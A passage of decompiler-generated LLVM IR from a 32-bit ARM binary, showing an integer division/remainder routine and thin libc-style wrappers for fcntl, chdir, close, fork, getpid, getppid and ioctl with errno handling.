bb88:                                             ; preds = %dec_label_pc_12c9c, %bb87
  %v0_12ca855 = phi i32 [ %v1_12ca0, %dec_label_pc_12c9c ], [ %v2_12c9c, %bb87 ]
  %v3_12ca4 = udiv i32 %v0_12ca4, 2
  br label %dec_label_pc_12ca8

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c84, %bb88
  %v2_12cac = phi i32 [ %v0_12c98, %dec_label_pc_12c84 ], [ %v3_12ca4, %bb88 ]
  %v1_12cac = phi i32 [ %v1_12c94, %dec_label_pc_12c84 ], [ %v0_12ca855, %bb88 ]
  %v3_12ca8 = icmp ult i32 %v1_12cac, %v2_12cac
  br i1 %v3_12ca8, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_12ca8
  %v2_12ca8 = sub i32 %v1_12cac, %v2_12cac
  br label %bb76

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12bf8
  %v0_12cb4 = load i32, i32* @lr, align 4
  %v0_12cb8 = call i32 @function_12da8()
  call void @__pseudo_branch(i32 %v0_12cb4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12cac, { 1, 2, 0 }
  uselistorder i32 %v0_12c98, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12c78, { 1, 0, 2 }
  uselistorder i32 %v7_12c70, { 1, 0 }
  uselistorder i32 %v3_12c6c, { 1, 0 }
  uselistorder i32 %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_12c60, { 1, 0 }
  uselistorder i32 %v4_12c58, { 1, 0 }
  uselistorder i32 %v4_12c50, { 1, 0 }
  uselistorder i32 %v6_12c70, { 3, 0, 2, 1 }
  uselistorder i32 %v2_12c40, { 1, 0 }
  uselistorder i32 %v1_12c34, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_12c20, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12c2c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12c00, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_12ca8, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_12c9c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_12c48, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_12cc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12cc4:
  store i32 %arg1, i32* @r0, align 4
  %v2_12cc4 = icmp eq i32 %arg2, 0
  br i1 %v2_12cc4, label %dec_label_pc_12d98, label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cc4
  %v1_12cc4 = icmp slt i32 %arg2, 0
  br i1 %v1_12cc4, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_12ccc
  %v2_12ccc = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_12ccc, %bb
  %v4_12ce4 = phi i32 [ %arg2, %dec_label_pc_12ccc ], [ %v2_12ccc, %bb ]
  %v0_12cd0 = load i32, i32* @r0, align 4
  %v1_12cd0 = icmp slt i32 %v0_12cd0, 0
  br i1 %v1_12cd0, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_12cd4 = sub i32 0, %v0_12cd0
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_12cdc = phi i32 [ %v0_12cd0, %bb79 ], [ %v2_12cd4, %bb80 ]
  %v1_12cd8 = add i32 %v4_12ce4, -1
  %v7_12cd8 = icmp eq i32 %v4_12ce4, 1
  br i1 %v7_12cd8, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_12cdc = icmp eq i32 %v1_12cdc, %v4_12ce4
  br i1 %v10_12cdc, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_12cdc = icmp ult i32 %v1_12cdc, %v4_12ce4
  br i1 %v4_12cdc, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_12ce4 = and i32 %v1_12cd8, %v4_12ce4
  %v8_12ce4 = icmp eq i32 %v6_12ce4, 0
  br i1 %v8_12ce4, label %.thread72, label %dec_label_pc_12cf4.preheader

dec_label_pc_12cf4.preheader:                     ; preds = %bb84
  %v2_12cf4109 = icmp ugt i32 %v4_12ce4, 268435455
  br i1 %v2_12cf4109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_12ce864 = phi i32 [ %v1_12cdc, %bb84 ], [ 0, %.thread70 ]
  %v3_12ce8 = and i32 %v1_12ce864, %v1_12cd8
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_12cf4.preheader
  %v0_12d08.pr35.lcssa = phi i32 [ %v4_12ce4, %dec_label_pc_12cf4.preheader ], [ %v4_12cfc, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12cf4.preheader ], [ %v2_12d009, %.thread2.thread7 ]
  br label %dec_label_pc_12d08thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_12cf4.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_12d009, %.thread2.thread7 ], [ 0, %dec_label_pc_12cf4.preheader ]
  %v0_12d08.pr35110 = phi i32 [ %v4_12cfc, %.thread2.thread7 ], [ %v4_12ce4, %dec_label_pc_12cf4.preheader ]
  %v4_12cf8 = icmp ult i32 %v0_12d08.pr35110, %v1_12cdc
  br i1 %v4_12cf8, label %bb86, label %dec_label_pc_12d08thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_12cfc = and i32 %v0_12d08.pr35110, 268435456
  %v3_12cfc = icmp eq i32 %v2_12cfc, 0
  %v4_12cfc = mul i32 %v0_12d08.pr35110, 16
  br i1 %v3_12cfc, label %.thread2.thread7, label %dec_label_pc_12d08.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_12d009 = add i32 %storemerge111, 4
  %v2_12cf4 = icmp ugt i32 %v4_12cfc, 268435455
  br i1 %v2_12cf4, label %.thread1, label %bb85

dec_label_pc_12d08thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_12d08thread-pre-split.loopexit

dec_label_pc_12d08thread-pre-split.loopexit:      ; preds = %dec_label_pc_12d08thread-pre-split.loopexit.loopexit, %.thread1
  %v0_12d08.pr35108 = phi i32 [ %v0_12d08.pr35.lcssa, %.thread1 ], [ %v0_12d08.pr35110, %dec_label_pc_12d08thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_12d08thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12d08thread-pre-split

dec_label_pc_12d08thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12d08thread-pre-split.loopexit
  %v1_12d1441 = phi i32 [ %storemerge105, %dec_label_pc_12d08thread-pre-split.loopexit ], [ %v2_12d14, %.thread4 ]
  %v2_12d0c36 = phi i32 [ %v1_12cdc, %dec_label_pc_12d08thread-pre-split.loopexit ], [ %v2_12d0c, %.thread4 ]
  %v0_12d08.pr = phi i32 [ %v0_12d08.pr35108, %dec_label_pc_12d08thread-pre-split.loopexit ], [ %v3_12d10, %.thread4 ]
  br label %dec_label_pc_12d08

dec_label_pc_12d08.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_12d08

dec_label_pc_12d08:                               ; preds = %dec_label_pc_12d08.loopexit, %dec_label_pc_12d08thread-pre-split
  %v0_12d1c.pr = phi i32 [ %v1_12d1441, %dec_label_pc_12d08thread-pre-split ], [ %storemerge111, %dec_label_pc_12d08.loopexit ]
  %v2_12d0c = phi i32 [ %v2_12d0c36, %dec_label_pc_12d08thread-pre-split ], [ %v1_12cdc, %dec_label_pc_12d08.loopexit ]
  %v1_12d10 = phi i32 [ %v0_12d08.pr, %dec_label_pc_12d08thread-pre-split ], [ %v4_12cfc, %dec_label_pc_12d08.loopexit ]
  %v2_12d08 = icmp slt i32 %v1_12d10, 0
  br i1 %v2_12d08, label %dec_label_pc_12d1c, label %bb87

bb87:                                             ; preds = %dec_label_pc_12d08
  %v4_12d0c = icmp ult i32 %v1_12d10, %v2_12d0c
  br i1 %v4_12d0c, label %.thread4, label %dec_label_pc_12d1c

.thread4:                                         ; preds = %bb87
  %v3_12d10 = mul i32 %v1_12d10, 2
  %v2_12d14 = add i32 %v0_12d1c.pr, 1
  br label %dec_label_pc_12d08thread-pre-split

dec_label_pc_12d1c:                               ; preds = %bb87, %dec_label_pc_12d08
  %v2_12d1c = add i32 %v0_12d1c.pr, -3
  %v5_12d20 = icmp slt i32 %v0_12d1c.pr, 3
  br i1 %v5_12d20, label %dec_label_pc_12d60, label %dec_label_pc_12d24

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d1c, %bb91
  %v6_12d4c = phi i32 [ %v0_12d54, %bb91 ], [ %v2_12d1c, %dec_label_pc_12d1c ]
  %v1_12d28 = phi i32 [ %v1_12d30.v6_12d30.v6_12d38.v6_12d40, %bb91 ], [ %v2_12d0c, %dec_label_pc_12d1c ]
  %v3_12d4810 = phi i32 [ %v3_12d48, %bb91 ], [ %v1_12d10, %dec_label_pc_12d1c ]
  %v3_12d24 = icmp ult i32 %v1_12d28, %v3_12d4810
  %v3_12d28 = select i1 %v3_12d24, i32 0, i32 %v3_12d4810
  %v1_12d30 = sub i32 %v1_12d28, %v3_12d28
  %v4_12d2c = udiv i32 %v3_12d4810, 2
  %v6_12d2c = icmp ult i32 %v1_12d30, %v4_12d2c
  %v6_12d30 = select i1 %v6_12d2c, i32 0, i32 %v4_12d2c
  %v1_12d30.v6_12d30 = sub i32 %v1_12d30, %v6_12d30
  %.demorgan = and i1 %v3_12d24, %v6_12d2c
  %v4_12d34 = udiv i32 %v3_12d4810, 4
  %v6_12d34 = icmp ult i32 %v1_12d30.v6_12d30, %v4_12d34
  %v6_12d38 = select i1 %v6_12d34, i32 0, i32 %v4_12d34
  %v1_12d30.v6_12d30.v6_12d38 = sub i32 %v1_12d30.v6_12d30, %v6_12d38
  %.demorgan76 = and i1 %.demorgan, %v6_12d34
  %v4_12d3c = udiv i32 %v3_12d4810, 8
  %v6_12d3c = icmp ult i32 %v1_12d30.v6_12d30.v6_12d38, %v4_12d3c
  %v6_12d40 = select i1 %v6_12d3c, i32 0, i32 %v4_12d3c
  %v1_12d30.v6_12d30.v6_12d38.v6_12d40 = sub i32 %v1_12d30.v6_12d30.v6_12d38, %v6_12d40
  %.demorgan77 = and i1 %.demorgan76, %v6_12d3c
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_12d24
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_12d24, %bb88
  %v2_12d44 = add i32 %v1_12d30.v6_12d30.v6_12d38.v6_12d40, -1
  %v4_12d44 = sub i32 0, %v1_12d30.v6_12d30.v6_12d38.v6_12d40
  %v5_12d44 = and i32 %v1_12d30.v6_12d30.v6_12d38.v6_12d40, %v4_12d44
  %v3_12d48 = udiv i32 %v3_12d4810, 16
  %v5_12d4c = icmp slt i32 %v1_12d30.v6_12d30.v6_12d38.v6_12d40, 1
  br i1 %v5_12d4c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_12d4c = add i32 %v6_12d4c, -4
  %v9_12d4c = sub i32 3, %v6_12d4c
  %v10_12d4c = and i32 %v9_12d4c, %v6_12d4c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_12d54 = phi i32 [ %v6_12d4c, %bb89 ], [ %v7_12d4c, %bb90 ]
  %v0_12d5013.in = phi i32 [ %v2_12d44, %bb89 ], [ %v7_12d4c, %bb90 ]
  %v1_12d5012.in = phi i32 [ %v5_12d44, %bb89 ], [ %v10_12d4c, %bb90 ]
  %v1_12d5012 = icmp slt i32 %v1_12d5012.in, 0
  %v0_12d5013 = icmp slt i32 %v0_12d5013.in, 0
  %v2_12d50 = xor i1 %v0_12d5013, %v1_12d5012
  br i1 %v2_12d50, label %dec_label_pc_12d54, label %dec_label_pc_12d24

dec_label_pc_12d54:                               ; preds = %bb91
  %v1_12d54 = urem i32 %v0_12d54, 4
  %v2_12d54 = icmp eq i32 %v1_12d54, 0
  br i1 %v2_12d54, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_12d54
  %v3_12d58 = icmp eq i32 %v1_12d30.v6_12d30.v6_12d38.v6_12d40, 0
  br i1 %v3_12d58, label %.thread6, label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %bb92, %dec_label_pc_12d1c
  %v0_12d74 = phi i32 [ %v3_12d48, %bb92 ], [ %v1_12d10, %dec_label_pc_12d1c ]
  %v1_12d70 = phi i32 [ %v1_12d30.v6_12d30.v6_12d38.v6_12d40, %bb92 ], [ %v2_12d0c, %dec_label_pc_12d1c ]
  %v0_12d60 = phi i32 [ %v0_12d54, %bb92 ], [ %v2_12d1c, %dec_label_pc_12d1c ]
  %v5_12d64 = icmp slt i32 %v0_12d60, -2
  br i1 %v5_12d64, label %dec_label_pc_12d84, label %dec_label_pc_12d68

dec_label_pc_12d68:                               ; preds = %dec_label_pc_12d60
  %v8_12d60 = icmp eq i32 %v0_12d60, -2
  br i1 %v8_12d60, label %dec_label_pc_12d78, label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d68
  %v3_12d6c = icmp ult i32 %v1_12d70, %v0_12d74
  br i1 %v3_12d6c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_12d6c
  %v2_12d6c = sub i32 %v1_12d70, %v0_12d74
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_12d6c, %bb93
  %v0_12d7854 = phi i32 [ %v1_12d70, %dec_label_pc_12d6c ], [ %v2_12d6c, %bb93 ]
  %v3_12d74 = udiv i32 %v0_12d74, 2
  br label %dec_label_pc_12d78

dec_label_pc_12d78:                               ; preds = %dec_label_pc_12d68, %bb94
  %v0_12d80 = phi i32 [ %v0_12d74, %dec_label_pc_12d68 ], [ %v3_12d74, %bb94 ]
  %v1_12d7c = phi i32 [ %v1_12d70, %dec_label_pc_12d68 ], [ %v0_12d7854, %bb94 ]
  %v3_12d78 = icmp ult i32 %v1_12d7c, %v0_12d80
  br i1 %v3_12d78, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_12d78
  %v2_12d78 = sub i32 %v1_12d7c, %v0_12d80
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_12d78, %bb95
  %v0_12d8457 = phi i32 [ %v1_12d7c, %dec_label_pc_12d78 ], [ %v2_12d78, %bb95 ]
  %v3_12d80 = udiv i32 %v0_12d80, 2
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12d60, %bb96
  %v2_12d88 = phi i32 [ %v0_12d74, %dec_label_pc_12d60 ], [ %v3_12d80, %bb96 ]
  %v1_12d88 = phi i32 [ %v1_12d70, %dec_label_pc_12d60 ], [ %v0_12d8457, %bb96 ]
  %v3_12d84 = icmp ult i32 %v1_12d88, %v2_12d88
  br i1 %v3_12d84, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_12d84
  %v2_12d84 = sub i32 %v1_12d88, %v2_12d88
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12d84, %bb83, %.thread72, %dec_label_pc_12d54, %bb92, %bb97
  %v1_12d90 = phi i32 [ %v1_12d30.v6_12d30.v6_12d38.v6_12d40, %dec_label_pc_12d54 ], [ 0, %bb92 ], [ %v1_12d88, %dec_label_pc_12d84 ], [ %v2_12d84, %bb97 ], [ %v3_12ce8, %.thread72 ], [ %v1_12cdc, %bb83 ]
  br i1 %v1_12cd0, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_12d90 = sub i32 0, %v1_12d90
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_12d94 = phi i32 [ %v1_12d90, %.thread6 ], [ %v2_12d90, %bb98 ]
  ret i32 %v1_12d94

dec_label_pc_12d98:                               ; preds = %dec_label_pc_12cc4
  %v0_12d98 = load i32, i32* @lr, align 4
  %v0_12d9c = call i32 @function_12da8()
  call void @__pseudo_branch(i32 %v0_12d98)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12d74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12d54, { 1, 0, 2 }
  uselistorder i32 %v7_12d4c, { 1, 0 }
  uselistorder i32 %v3_12d48, { 1, 0 }
  uselistorder i32 %v1_12d30.v6_12d30.v6_12d38.v6_12d40, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_12d3c, { 1, 0 }
  uselistorder i32 %v4_12d34, { 1, 0 }
  uselistorder i32 %v4_12d2c, { 1, 0 }
  uselistorder i32 %v6_12d4c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_12d1c, { 1, 0 }
  uselistorder i32 %v1_12d10, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_12d0c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_12cfc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12d08.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12cdc, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_12ce4, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @function_12da8, { 2, 1, 0 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_12d84, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12d78, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_12d24, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_12da8() local_unnamed_addr {
dec_label_pc_12da8:
  %v1_12da8 = load i32, i32* @r0, align 4
  ret i32 %v1_12da8
}

define i32 @function_12dac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12dac:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_12dac = load i32, i32* @r2, align 4
  %v1_12dbc = add i32 %arg2, -12
  store i32 %v6_12dac, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_12dbc, 2
  br i1 %tmp, label %dec_label_pc_12de4, label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12dac
  %v0_12ddc = call i32 @function_12e20()
  br label %dec_label_pc_12e10

dec_label_pc_12de4:                               ; preds = %dec_label_pc_12dac
  %v2_12dec = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_12dec, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_12dec, -4095
  br i1 %tmp8, label %dec_label_pc_12e10, label %dec_label_pc_12dfc

dec_label_pc_12dfc:                               ; preds = %dec_label_pc_12de4
  %v0_12dfc = call i32 @function_13470()
  %v0_12e00 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e00 = sub i32 0, %v0_12e00
  %v2_12e04 = inttoptr i32 %v0_12dfc to i32*
  store i32 %v1_12e00, i32* %v2_12e04, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e10

dec_label_pc_12e10:                               ; preds = %dec_label_pc_12dfc, %dec_label_pc_12de4, %dec_label_pc_12ddc
  %storemerge = phi i32 [ %v0_12ddc, %dec_label_pc_12ddc ], [ %v2_12dec, %dec_label_pc_12de4 ], [ -1, %dec_label_pc_12dfc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_12dec, { 1, 0, 2 }
}

define i32 @function_12e20() local_unnamed_addr {
dec_label_pc_12e20:
  %r4.global-to-local = alloca i32, align 4
  %v0_12e40 = load i32, i32* @r0, align 4
  store i32 %v0_12e40, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e40, -4095
  br i1 %tmp, label %dec_label_pc_12e5c, label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %dec_label_pc_12e20
  %v0_12e4c = call i32 @function_13470()
  %v0_12e50 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e50 = sub i32 0, %v0_12e50
  %v2_12e54 = inttoptr i32 %v0_12e4c to i32*
  store i32 %v1_12e50, i32* %v2_12e54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e20, %dec_label_pc_12e4c
  %v0_12e5c = phi i32 [ %v0_12e40, %dec_label_pc_12e20 ], [ -1, %dec_label_pc_12e4c ]
  ret i32 %v0_12e5c

; uselistorder directives
  uselistorder i32 %v0_12e40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e5c, { 1, 0 }
}

define i32 @function_12e70(i8* %arg1) local_unnamed_addr {
dec_label_pc_12e70:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e70 = load i32, i32* @r4, align 4
  store i32 %v3_12e70, i32* %stack_var_-8, align 4
  %v3_12e74 = call i32 @chdir(i8* %arg1)
  store i32 %v3_12e74, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_12e74, -4095
  br i1 %tmp, label %dec_label_pc_12e94, label %dec_label_pc_12e84

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12e70
  %v0_12e84 = call i32 @function_13470()
  %v0_12e88 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e88 = sub i32 0, %v0_12e88
  %v2_12e8c = inttoptr i32 %v0_12e84 to i32*
  store i32 %v1_12e88, i32* %v2_12e8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e70, %dec_label_pc_12e84
  %v0_12e94 = phi i32 [ %v3_12e74, %dec_label_pc_12e70 ], [ -1, %dec_label_pc_12e84 ]
  %v2_12e98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e98, i32* @r4, align 4
  ret i32 %v0_12e94

; uselistorder directives
  uselistorder i32 %v3_12e74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e94, { 1, 0 }
}

define i32 @function_12e9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e9c = load i32, i32* @r4, align 4
  store i32 %v3_12e9c, i32* %stack_var_-8, align 4
  %v1_12ea0 = call i32 @close(i32 %arg1)
  store i32 %v1_12ea0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_12ea0, -4095
  br i1 %tmp, label %dec_label_pc_12ec0, label %dec_label_pc_12eb0

dec_label_pc_12eb0:                               ; preds = %dec_label_pc_12e9c
  %v0_12eb0 = call i32 @function_13470()
  %v0_12eb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12eb4 = sub i32 0, %v0_12eb4
  %v2_12eb8 = inttoptr i32 %v0_12eb0 to i32*
  store i32 %v1_12eb4, i32* %v2_12eb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ec0

dec_label_pc_12ec0:                               ; preds = %dec_label_pc_12e9c, %dec_label_pc_12eb0
  %v0_12ec0 = phi i32 [ %v1_12ea0, %dec_label_pc_12e9c ], [ -1, %dec_label_pc_12eb0 ]
  %v2_12ec4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12ec4, i32* @r4, align 4
  ret i32 %v0_12ec0

; uselistorder directives
  uselistorder i32 %v1_12ea0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ec0, { 1, 0 }
}

define i32 @function_12ec8() local_unnamed_addr {
dec_label_pc_12ec8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ec8 = load i32, i32* @r4, align 4
  store i32 %v3_12ec8, i32* %stack_var_-8, align 4
  %v0_12ecc = call i32 @fork()
  store i32 %v0_12ecc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ecc, -4095
  br i1 %tmp, label %dec_label_pc_12eec, label %dec_label_pc_12edc

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12ec8
  %v0_12edc = call i32 @function_13470()
  %v0_12ee0 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ee0 = sub i32 0, %v0_12ee0
  %v2_12ee4 = inttoptr i32 %v0_12edc to i32*
  store i32 %v1_12ee0, i32* %v2_12ee4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12eec

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12ec8, %dec_label_pc_12edc
  %v0_12eec = phi i32 [ %v0_12ecc, %dec_label_pc_12ec8 ], [ -1, %dec_label_pc_12edc ]
  %v2_12ef0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12ef0, i32* @r4, align 4
  ret i32 %v0_12eec

; uselistorder directives
  uselistorder i32 %v0_12ecc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12eec, { 1, 0 }
}

define i32 @function_12ef4() local_unnamed_addr {
dec_label_pc_12ef4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ef4 = load i32, i32* @r4, align 4
  store i32 %v3_12ef4, i32* %stack_var_-8, align 4
  %v0_12ef8 = call i32 @getpid()
  store i32 %v0_12ef8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ef8, -4095
  br i1 %tmp, label %dec_label_pc_12f18, label %dec_label_pc_12f08

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12ef4
  %v0_12f08 = call i32 @function_13470()
  %v0_12f0c = load i32, i32* %r4.global-to-local, align 4
  %v1_12f0c = sub i32 0, %v0_12f0c
  %v2_12f10 = inttoptr i32 %v0_12f08 to i32*
  store i32 %v1_12f0c, i32* %v2_12f10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f18

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12ef4, %dec_label_pc_12f08
  %v0_12f18 = phi i32 [ %v0_12ef8, %dec_label_pc_12ef4 ], [ -1, %dec_label_pc_12f08 ]
  %v2_12f1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12f1c, i32* @r4, align 4
  ret i32 %v0_12f18

; uselistorder directives
  uselistorder i32 %v0_12ef8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f18, { 1, 0 }
}

define i32 @function_12f20() local_unnamed_addr {
dec_label_pc_12f20:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f20 = load i32, i32* @r4, align 4
  store i32 %v3_12f20, i32* %stack_var_-8, align 4
  %v0_12f24 = call i32 @getppid()
  store i32 %v0_12f24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f24, -4095
  br i1 %tmp, label %dec_label_pc_12f44, label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f20
  %v0_12f34 = call i32 @function_13470()
  %v0_12f38 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f38 = sub i32 0, %v0_12f38
  %v2_12f3c = inttoptr i32 %v0_12f34 to i32*
  store i32 %v1_12f38, i32* %v2_12f3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f20, %dec_label_pc_12f34
  %v0_12f44 = phi i32 [ %v0_12f24, %dec_label_pc_12f20 ], [ -1, %dec_label_pc_12f34 ]
  %v2_12f48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12f48, i32* @r4, align 4
  ret i32 %v0_12f44

; uselistorder directives
  uselistorder i32 %v0_12f24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f44, { 1, 0 }
}

define i32 @function_12f4c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12f4c:
  %r4.global-to-local = alloca i32, align 4
  %v2_12f68 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_12f68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12f68, -4095
  br i1 %tmp, label %dec_label_pc_12f88, label %dec_label_pc_12f78

dec_label_pc_12f78:                               ; preds = %dec_label_pc_12f4c
  %v0_12f78 = call i32 @function_13470()
  %v0_12f7c = load i32, i32* %r4.global-to-local, align 4
  %v1_12f7c = sub i32 0, %v0_12f7c
  %v2_12f80 = inttoptr i32 %v0_12f78 to i32*
  store i32 %v1_12f7c, i32* %v2_12f80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12f4c, %dec_label_pc_12f78
